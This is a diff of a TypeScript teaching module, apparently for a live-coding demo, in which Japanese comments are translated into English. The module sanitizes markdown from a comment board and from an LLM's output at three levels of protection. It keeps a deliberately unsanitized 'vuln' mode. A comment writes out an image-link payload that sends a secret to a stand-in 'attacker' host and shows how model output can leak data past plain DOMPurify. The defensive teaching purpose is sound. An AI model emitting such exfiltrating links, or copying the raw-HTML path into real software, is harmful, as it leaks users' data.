@@ -4,27 +4,28 @@ import DOMPurify from "dompurify";
 marked.setOptions({ breaks: true });
 
 // =============================================================================
-// コメント掲示板(基礎パート)用。safeMode の ON/OFF で挙動が変わる。
+// For the Comment Board (basics). Behavior changes with the safeMode ON/OFF.
 // =============================================================================
 export function renderComment(markdownText: string, safeMode: boolean): string {
   const rawHtml = marked.parse(markdownText, { async: false }) as string;
-  if (!safeMode) return rawHtml; // 🔓 無害化しない
+  if (!safeMode) return rawHtml; // 🔓 no sanitization
   return DOMPurify.sanitize(rawHtml, {
     ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|#|\/)/i,
   });
 }
 
 // =============================================================================
-// AIパート用。LLMの出力(markdown)を画面に出すときの3段階。
-// ライブコーディングは、この関数を vuln → dompurify → safe と育てていくイメージ。
+// For the AI part. Three stages of rendering an LLM's (markdown) output on screen.
+// The live-coding story is "growing" this function from vuln → dompurify → safe.
 // =============================================================================
 export type RenderMode = "vuln" | "dompurify" | "safe";
 
-// リンクに許可するURLスキーム(javascript: を根本から排除)
+// URL schemes allowed on links (eliminates javascript: at the root).
 const SAFE_URL = /^(?:https?:|mailto:|#|\/)/i;
 
-// 画像srcとして許可するのは「同一オリジン」だけ。
-// 外部ホストの画像は、URLに秘密を載せて外へ送る"情報漏洩"の温床なので弾く。
+// Only same-origin images are allowed as <img> src.
+// External-host images are a prime vector for exfiltration (smuggling secrets out via the URL),
+// so we drop them.
 function isSameOrigin(src: string): boolean {
   try {
     return new URL(src, location.origin).origin === location.origin;
@@ -34,28 +35,28 @@ function isSameOrigin(src: string): boolean {
 }
 
 export function renderLLM(markdownText: string, mode: RenderMode): string {
-  // ★順番が重要★ 必ず「Markdown → HTML変換」してから「サニタイズ」する。
-  //   逆順(サニタイズ→変換)にすると、記号が壊れたり変換後のHTMLが素通りする。
+  // ★ ORDER MATTERS ★ Always "Markdown → HTML" first, THEN "sanitize".
+  //   Reversing it (sanitize → convert) breaks symbols or lets the generated HTML slip through.
   const rawHtml = marked.parse(markdownText, { async: false }) as string;
 
-  // vuln: 生のHTMLをそのまま。onerror も javascript: も 画像漏洩も全部通る。
+  // vuln: raw HTML as-is. onerror, javascript:, and image exfiltration all get through.
   if (mode === "vuln") {
     return rawHtml;
   }
 
-  // dompurify: 素のDOMPurify。
-  //   → onerror や javascript: リンクは消える(JS実行は防げる)。
-  //   → でも <img> は"正当なタグ"として許可されるので、
-  //     ![](http://attacker/steal?c=秘密) による【情報漏洩は防げない】。
-  //   「DOMPurify入れたのに漏れる」の正体がこれ。
+  // dompurify: plain DOMPurify.
+  //   → onerror and javascript: links are removed (JS execution is blocked).
+  //   → BUT <img> is allowed as a "legitimate tag", so
+  //     ![](http://attacker/steal?c=secret) still EXFILTRATES — it cannot stop that.
+  //   This is exactly why "we added DOMPurify but data still leaks."
   if (mode === "dompurify") {
     return DOMPurify.sanitize(rawHtml);
   }
 
-  // safe: 多層で締める
-  //   (1) リンクのURLスキームを許可リスト化
-  //   (2) 外部オリジンの画像を除去(= 情報漏洩を遮断)
-  //   (3) 本番ではさらに CSP (img-src 'self' 等) を併用するのが正道
+  // safe: layered defense
+  //   (1) allowlist URL schemes on links
+  //   (2) remove external-origin images (= cut off exfiltration)
+  //   (3) in production, also pair this with a CSP (img-src 'self', etc.)
   const cleaned = DOMPurify.sanitize(rawHtml, { ALLOWED_URI_REGEXP: SAFE_URL });
   const tpl = document.createElement("template");
   tpl.innerHTML = cleaned;
